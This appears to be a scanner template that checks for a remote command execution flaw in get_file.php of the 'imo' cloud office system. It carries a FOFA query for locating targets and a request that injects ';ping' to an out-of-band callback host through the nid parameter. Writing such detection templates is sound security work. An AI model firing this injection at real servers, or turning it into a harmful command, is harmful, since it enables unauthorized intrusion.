expression: r0()
id: imo-get-file-rce
info:
  author: daffainfo
  description: "imo\u4E91\u529E\u516C\u5BA4\u7531\u4E0A\u6D77\u6613\u7766\u7F51\u7EDC\
    \u79D1\u6280\u6709\u9650\u516C\u53F8\u4E8E2007\u5E74\u521B\u7ACB\uFF0C\u603B\u90E8\
    \u4F4D\u4E8E\u4E0A\u6D77\uFF0Cimo\u4E91\u529E\u516C\u5BA4\u7BA1\u7406\u8FD0\u8425\
    \u4F01\u4E1A\u5373\u65F6\u901A\u8BAF\u5E73\u53F0imo\uFF0C\u5305\u62EC\u5BF9imo\u7684\
    \u5728\u7EBF\u652F\u6301\uFF0C\u6545\u969C\u5904\u7406\uFF0C\u5BA2\u6237\u670D\
    \u52A1\u7B49\uFF0C\u5BF9imo\u8FDB\u884C\u6301\u7EED\u7814\u53D1\uFF0C\u63D0\u4F9B\
    \u5728\u7EBF\u5347\u7EA7\u7B49\u3002imo\u4E91\u529E\u516C\u5BA4\u7CFB\u7EDF get_file.php\
    \ \u5B58\u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF0C\u653B\u51FB\
    \u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u670D\u52A1\u5668\u6743\
    \u9650\uFF0C\u5BFC\u81F4\u670D\u52A1\u5668\u5931\u9677\u3002\nfofa-query: app=\"\
    iMO-\u4E91\u529E\u516C\u5BA4\"\n"
  name: "imo \u4E91\u529E\u516C\u5BA4 get_file.php \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\
    \u6F0F\u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/zW8oOiILwT4mywsrMJN1fQ
  severity: critical
  verified: false
rules:
  r0:
    expression: reverse.wait(5)
    request:
      method: GET
      path: /file/NDisk/get_file.php?cid=1&nid=;ping%20{{reverseURL}};
set:
  reverse: newReverse()
  reverseURL: reverse.url.host
